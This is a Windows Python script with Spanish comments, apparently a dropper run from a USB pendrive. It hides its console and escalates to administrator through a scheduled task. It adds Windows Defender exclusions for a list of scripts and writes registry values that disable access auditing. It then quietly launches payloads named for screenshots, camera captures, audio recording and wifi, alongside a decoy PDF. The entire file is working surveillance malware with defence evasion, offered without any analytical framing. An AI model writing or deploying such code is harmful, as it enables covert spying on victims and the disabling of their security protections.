import os
import subprocess
import time
import ctypes
import winreg
import sys

def hide_console():
    """Oculta la ventana de la consola en sistemas Windows."""
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def is_admin():
    """Verifica si el script se está ejecutando con privilegios de administrador."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Ejecuta el script como administrador."""
    subprocess.run(["schtasks", "/create", "/tn", "EjecutarScriptAdministrador", "/tr", os.path.abspath(__file__), "/sc", "once", "/st", "00:00", "/rl", "highest", "/f"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["schtasks", "/run", "/tn", "EjecutarScriptAdministrador"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["schtasks", "/delete", "/tn", "EjecutarScriptAdministrador", "/f"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Ocultar la consola
hide_console()

if not is_admin():
    run_as_admin()
    exit()

# Agregar exclusiones en Windows Defender para scripts específicos
exclusions = [
    'PRESENTACIoN.pdf', 'PRESENTACION.pyw', 'ejecutarOculto.vbs', 'saberyganar.pyw',
    'wifi.pyw', 'instalables.pyw', 'screenshot-fivesec.pyw',
    'camerashot-5sec.pyw', 'recording.pyw'
]

for exclusion in exclusions:
    subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionProcess '{exclusion}'"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Modificar el registro de Windows para desactivar auditorías específicas
registry_paths = [
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "AuditObjectAccess", 0),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives", 0),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Audit", "AuditObjectAccess", 0)
]

for path, name, value in registry_paths:
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
    except FileNotFoundError:
        pass  # Ignorar si la clave no se encuentra
    except PermissionError:
        pass  # Ignorar si no se tienen permisos

# Comprobar la presencia de la unidad del PenDrive y ejecutar scripts
drive = "F:"

def check_pendrive_and_execute():
    while True:
        if os.path.exists(drive):
            scripts = [
                "PRESENTACION.pyw", "ejecutarOculto.vbs", "PRESENTACIoN.pdf",
                "saberyganar.pyw", "wifi.pyw", "instalables.pyw",
                ("pythonw", "screenshot-fivesec.pyw"),
                ("pythonw", "camerashot-5sec.pyw"),
                ("pythonw", "recording.pyw")
            ]
            for script in scripts:
                if isinstance(script, tuple):
                    # Ejecutar con pythonw en segundo plano (sin abrir consola)
                    subprocess.run(script, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    # Ejecutar con start minimizado y sin mostrar la consola
                    subprocess.run(["start", "/min", script], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            break
        else:
            time.sleep(5)  # Esperar sin mostrar ningún mensaje

check_pendrive_and_execute()
